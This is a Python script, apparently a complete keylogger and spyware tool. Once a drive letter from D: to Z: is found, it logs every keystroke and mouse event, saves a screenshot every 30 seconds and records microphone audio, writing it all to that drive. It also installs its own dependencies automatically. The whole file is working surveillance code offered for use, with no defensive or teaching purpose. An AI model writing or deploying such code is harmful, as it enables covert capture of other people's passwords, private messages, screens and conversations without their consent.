import subprocess
import sys
import pkg_resources

# List of required packages
required = {'pynput', 'pyautogui', 'pyaudio'}
installed = {pkg.key for pkg in pkg_resources.working_set}
missing = required - installed

# Install missing packages
if missing:
    print(f"Installing missing packages: {missing}")
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', *missing])

import os
import time
import threading
import pyautogui
from pynput import keyboard, mouse
import pyaudio
import wave
import sys

# ... (rest of your code here)


# Global variables
keyboard_log_file = None
mouse_log_file = None
screenshot_folder = None
audio_file = None
running = True  # Flag to control execution of threads
usb_drive_path = None  # To store the detected USB drive path

# 1. Check if the USB is plugged in (for Windows drives D: to Z:)
def check_usb_drive():
    global usb_drive_path
    possible_drives = [f"{chr(d)}:\\" for d in range(ord('D'), ord('Z') + 1)]
    
    for drive in possible_drives:
        if os.path.exists(drive):
            usb_drive_path = drive
            return True
    return False

# 2. Keyboard Logging
def keylogger():
    def on_press(key):
        global running
        if key == keyboard.Key.esc:
            running = False  # Stop the script when 'Esc' is pressed
            return False
        with open(keyboard_log_file, 'a') as log:
            try:
                log.write(f"{key.char}\n")
            except AttributeError:
                log.write(f"[{str(key)}]\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# 3. Mouse Logging
def mouse_logger():
    def on_click(x, y, button, pressed):
        if not running:
            return False
        with open(mouse_log_file, 'a') as log:
            if pressed:
                log.write(f"Mouse clicked at ({x}, {y}) with {button}\n")
            else:
                log.write(f"Mouse released at ({x}, {y}) with {button}\n")
    
    def on_move(x, y):
        if not running:
            return False
        with open(mouse_log_file, 'a') as log:
            log.write(f"Mouse moved to ({x}, {y})\n")

    with mouse.Listener(on_click=on_click, on_move=on_move) as listener:
        listener.join()

# 4. Take Screenshots
def screenshot_taker():
    if not os.path.exists(screenshot_folder):
        os.makedirs(screenshot_folder)
    
    while running:
        screenshot = pyautogui.screenshot()
        screenshot.save(f"{screenshot_folder}/screenshot_{time.time()}.png")
        time.sleep(30)  # Take screenshot every 30 seconds

# 5. Record Microphone Audio
def audio_recorder():
    chunk = 1024  # Record in chunks of 1024 samples
    sample_format = pyaudio.paInt16  # 16 bits per sample
    channels = 1
    rate = 44100  # Record at 44100 samples per second
    record_seconds = 10  # Each audio file will be 10 seconds long

    p = pyaudio.PyAudio()

    while running:
        stream = p.open(format=sample_format,
                        channels=channels,
                        rate=rate,
                        frames_per_buffer=chunk,
                        input=True)

        print("Recording audio...")
        frames = []

        for _ in range(0, int(rate / chunk * record_seconds)):
            if not running:
                break
            data = stream.read(chunk)
            frames.append(data)

        stream.stop_stream()
        stream.close()

        wf = wave.open(audio_file, 'wb')
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(sample_format))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))
        wf.close()

    p.terminate()

# 6. Set file paths on USB
def set_paths():
    global keyboard_log_file, mouse_log_file, screenshot_folder, audio_file
    keyboard_log_file = os.path.join(usb_drive_path, "keyboard_log.txt")
    mouse_log_file = os.path.join(usb_drive_path, "mouse_log.txt")
    screenshot_folder = os.path.join(usb_drive_path, "screenshots")
    audio_file = os.path.join(usb_drive_path, "mic_recording.wav")

# Run all tasks concurrently
if __name__ == "__main__":
    try:
        # Continuously check for USB drive
        print("Waiting for USB drive...")
        while not check_usb_drive():
            time.sleep(5)  # Check every 5 seconds

        print(f"USB drive detected at {usb_drive_path}")
        set_paths()  # Set file paths to USB drive

        # Start keylogger, mouse logger, screenshot, and audio recorder
        threading.Thread(target=keylogger).start()
        threading.Thread(target=mouse_logger).start()
        threading.Thread(target=screenshot_taker).start()
        threading.Thread(target=audio_recorder).start()

        # Continuously check if USB is removed
        while True:
            if not check_usb_drive():
                print("USB drive removed! Stopping execution.")
                running = False  # Set the running flag to false to stop all processes
                break
            time.sleep(5)  # Check every 5 seconds if the USB is still plugged in

    except KeyboardInterrupt:
        running = False  # If you manually stop the script with Ctrl+C
        print("Program stopped manually.")
        sys.exit(0)

